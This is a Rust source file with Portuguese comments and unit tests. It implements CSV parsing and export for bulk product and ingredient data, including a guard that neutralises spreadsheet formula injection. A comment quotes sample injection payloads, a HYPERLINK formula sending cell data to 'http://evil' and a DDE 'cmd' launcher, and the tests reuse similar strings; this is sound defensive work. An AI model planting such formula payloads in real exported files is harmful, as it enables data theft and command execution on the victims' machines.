//! Motor de CSV compartilhado pelos cadastros em massa (produtos, insumos).
//! Separado para não duplicar parser/serializador entre features (§14).
//!
//! Convenção: separador `;` (Excel pt-BR), UTF-8 com BOM na exportação,
//! números com vírgula decimal. O parser tolera aspas com `""` escapado,
//! campos com `;`/quebra dentro de aspas, e `\r\n`/`\n`.

use std::collections::HashMap;

use rust_decimal::Decimal;

use crate::format::{parse_money_br, parse_money_br_f64};
use crate::MainWindow;

use super::helpers::show_toast;

/// Vazio → `None`; senão `Some(trim)`.
pub(crate) fn opt(s: String) -> Option<String> {
    let t = s.trim();
    if t.is_empty() { None } else { Some(t.to_string()) }
}

/// Célula numérica → `Decimal` (aceita vírgula/ponto); vazia → `None`.
pub(crate) fn dec_or_none(s: &str) -> Option<Decimal> {
    if s.trim().is_empty() { None } else { parse_money_br(s) }
}

/// Célula numérica → `f64`; vazia/inválida → `default`.
pub(crate) fn num_or(s: &str, default: f64) -> f64 {
    if s.trim().is_empty() { default } else { parse_money_br_f64(s).unwrap_or(default) }
}

/// Célula numérica → `Option<f64>`; vazia → `None`.
pub(crate) fn num_or_none(s: &str) -> Option<f64> {
    if s.trim().is_empty() { None } else { parse_money_br_f64(s) }
}

pub(crate) fn bool_or(s: &str, default: bool) -> bool {
    if s.trim().is_empty() { default } else { parse_bool(s) }
}

pub(crate) fn parse_bool(s: &str) -> bool {
    matches!(s.trim().to_lowercase().as_str(), "sim" | "s" | "true" | "1" | "x" | "yes")
}

pub(crate) fn bool_pt(b: bool) -> String {
    if b { "sim".to_string() } else { "nao".to_string() }
}

/// Decimal → texto com vírgula decimal; `None` → vazio.
pub(crate) fn fmt_dec(v: Option<Decimal>) -> String {
    v.map(|d| d.normalize().to_string().replace('.', ",")).unwrap_or_default()
}

/// f64 → texto com vírgula decimal (sem casas supérfluas).
pub(crate) fn fmt_num(v: f64) -> String {
    format!("{v}").replace('.', ",")
}

/// Escapa um campo CSV e NEUTRALIZA injeção de fórmula (§11).
///
/// Duas defesas: (1) envolve em aspas quando o campo contém `;`, `"` ou quebra
/// (estrutura do CSV); (2) prefixa com `'` quando o 1º caractere dispararia
/// fórmula em Excel/LibreOffice/Sheets (`= + - @ TAB CR`). Sem (2), um nome de
/// produto/insumo como `=HYPERLINK("http://evil"&A1,"x")` ou `=cmd|'/c calc'!A1`
/// (DDE) executaria ao abrir o CSV — e o dado é não-confiável (um funcionário de
/// baixo privilégio o grava; o admin exporta e abre; vale também para dado vindo
/// por sync). O prefixo é revertido no import por `strip_formula_guard`.
pub(crate) fn csv_field(s: &str) -> String {
    let guarded = if starts_formula(s) { format!("'{s}") } else { s.to_string() };
    if guarded.contains([';', '"', '\n', '\r']) {
        format!("\"{}\"", guarded.replace('"', "\"\""))
    } else {
        guarded
    }
}

/// O 1º caractere dispara fórmula em planilhas?
fn starts_formula(s: &str) -> bool {
    matches!(s.chars().next(), Some('=' | '+' | '-' | '@' | '\t' | '\r'))
}

/// Inverso de `csv_field`: remove o prefixo defensivo `'` quando ele precede um
/// caractere de fórmula, preservando o round-trip export→import (ex.: `'-1,5` →
/// `-1,5`, inclusive números negativos). Deixa intacto qualquer outro `'`.
pub(crate) fn strip_formula_guard(s: &str) -> &str {
    match s.strip_prefix('\'') {
        Some(rest) if starts_formula(rest) => rest,
        _ => s,
    }
}

/// Campo texto opcional na atualização: coluna presente → valor da célula
/// (vazio = limpa); ausente → mantém o atual.
pub(crate) fn cell_str(
    has: &impl Fn(&str) -> bool,
    get: &impl Fn(&str) -> String,
    key: &str,
    existing: Option<String>,
) -> Option<String> {
    if has(key) { opt(get(key)) } else { existing }
}

/// Idem para campo `Decimal`.
pub(crate) fn cell_dec(
    has: &impl Fn(&str) -> bool,
    get: &impl Fn(&str) -> String,
    key: &str,
    existing: Option<Decimal>,
) -> Option<Decimal> {
    if has(key) { dec_or_none(&get(key)) } else { existing }
}

/// Loga a falha de uma linha do import e retorna `false` (para contagem).
pub(crate) fn log_err(acao: &str, nome: &str, err: Option<letaf_core::error::CoreError>) -> bool {
    match err {
        None => true,
        Some(e) => {
            tracing::warn!("import: não deu para {acao} '{nome}': {e}");
            false
        }
    }
}

/// Cabeçalho → índice por nome normalizado (minúsculo, sem acento).
pub(crate) fn header_index(header: &[String]) -> HashMap<String, usize> {
    header.iter().enumerate().map(|(i, h)| (normalize_key(h), i)).collect()
}

/// Normaliza o nome da coluna: minúsculas, sem acento, trim.
pub(crate) fn normalize_key(s: &str) -> String {
    s.trim()
        .to_lowercase()
        .chars()
        .map(|c| match c {
            'á' | 'à' | 'â' | 'ã' | 'ä' => 'a',
            'é' | 'è' | 'ê' | 'ë' => 'e',
            'í' | 'ì' | 'î' | 'ï' => 'i',
            'ó' | 'ò' | 'ô' | 'õ' | 'ö' => 'o',
            'ú' | 'ù' | 'û' | 'ü' => 'u',
            'ç' => 'c',
            other => other,
        })
        .collect()
}

/// Toast na thread da UI (usado nos erros de leitura do arquivo).
pub(crate) fn toast_import(ui_weak: &slint::Weak<MainWindow>, msg: &str, kind: &str) {
    let (msg, kind) = (msg.to_string(), kind.to_string());
    let ui_weak = ui_weak.clone();
    let _ = slint::invoke_from_event_loop(move || {
        if let Some(ui) = ui_weak.upgrade() {
            show_toast(&ui, &msg, &kind);
        }
    });
}

/// Parser CSV mínimo mas correto: aspas, `""` escapado, `;` separador,
/// registros por `\n` (ignora `\r`). Campos podem conter quebras dentro
/// de aspas. Remove o BOM do 1º campo do 1º registro.
pub(crate) fn parse_csv(content: &str, sep: char) -> Vec<Vec<String>> {
    let mut records = Vec::new();
    let mut record: Vec<String> = Vec::new();
    let mut field = String::new();
    let mut in_quotes = false;
    let mut dirty = false;
    let mut chars = content.chars().peekable();
    while let Some(c) = chars.next() {
        if in_quotes {
            if c == '"' {
                if chars.peek() == Some(&'"') {
                    field.push('"');
                    chars.next();
                } else {
                    in_quotes = false;
                }
            } else {
                field.push(c);
            }
            continue;
        }
        if c == '"' {
            in_quotes = true;
            dirty = true;
        } else if c == sep {
            record.push(std::mem::take(&mut field));
            dirty = true;
        } else if c == '\n' {
            record.push(std::mem::take(&mut field));
            records.push(std::mem::take(&mut record));
            dirty = false;
        } else if c == '\r' {
            // ignora (parte de \r\n)
        } else {
            field.push(c);
            dirty = true;
        }
    }
    if dirty || !field.is_empty() || !record.is_empty() {
        record.push(field);
        records.push(record);
    }
    if let Some(first) = records.first_mut().and_then(|r| r.first_mut()) {
        *first = first.trim_start_matches('\u{FEFF}').to_string();
    }
    records
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_simples() {
        let r = parse_csv("a;b;c\r\n1;2;3\r\n", ';');
        assert_eq!(r, vec![vec!["a", "b", "c"], vec!["1", "2", "3"]]);
    }

    #[test]
    fn parse_aspas_com_separador_e_quebra() {
        let r = parse_csv("nome;desc\r\n\"Taça; 250ml\";\"diz \"\"oi\"\"\"\r\n", ';');
        assert_eq!(r.len(), 2);
        assert_eq!(r[1][0], "Taça; 250ml");
        assert_eq!(r[1][1], "diz \"oi\"");
    }

    #[test]
    fn parse_sem_quebra_final() {
        let r = parse_csv("a;b\n1;2", ';');
        assert_eq!(r, vec![vec!["a", "b"], vec!["1", "2"]]);
    }

    #[test]
    fn round_trip_campo_escapado() {
        assert_eq!(csv_field("Taça; 250ml"), "\"Taça; 250ml\"");
        assert_eq!(csv_field("simples"), "simples");
        assert_eq!(csv_field("diz \"oi\""), "\"diz \"\"oi\"\"\"");
    }

    #[test]
    fn neutraliza_formula_no_export() {
        // Campos que disparariam fórmula ganham o prefixo defensivo `'`.
        assert_eq!(csv_field("=HYPERLINK(\"x\")"), "\"'=HYPERLINK(\"\"x\"\")\"");
        assert_eq!(csv_field("+1"), "'+1");
        assert_eq!(csv_field("-cmd"), "'-cmd");
        assert_eq!(csv_field("@x"), "'@x");
        // Texto benigno não é tocado.
        assert_eq!(csv_field("Coca-Cola"), "Coca-Cola");
    }

    #[test]
    fn strip_formula_guard_round_trip() {
        // Inverso exato do export, inclusive número negativo.
        assert_eq!(strip_formula_guard("'=cmd"), "=cmd");
        assert_eq!(strip_formula_guard("'-1,5"), "-1,5");
        assert_eq!(strip_formula_guard(csv_field("=perigo").trim_matches('"')), "=perigo");
        // `'` que NÃO precede fórmula fica intacto (não corrompe dado legítimo).
        assert_eq!(strip_formula_guard("'aspas"), "'aspas");
        assert_eq!(strip_formula_guard("normal"), "normal");
    }

    #[test]
    fn bool_ida_e_volta() {
        assert!(parse_bool(&bool_pt(true)));
        assert!(!parse_bool(&bool_pt(false)));
        assert!(parse_bool("SIM"));
        assert!(!parse_bool(""));
    }

    #[test]
    fn numeros_com_virgula() {
        assert_eq!(fmt_num(12.0), "12");
        assert_eq!(fmt_num(1.5), "1,5");
        assert_eq!(num_or("1,5", 0.0), 1.5);
        assert_eq!(num_or("", 7.0), 7.0);
    }
}
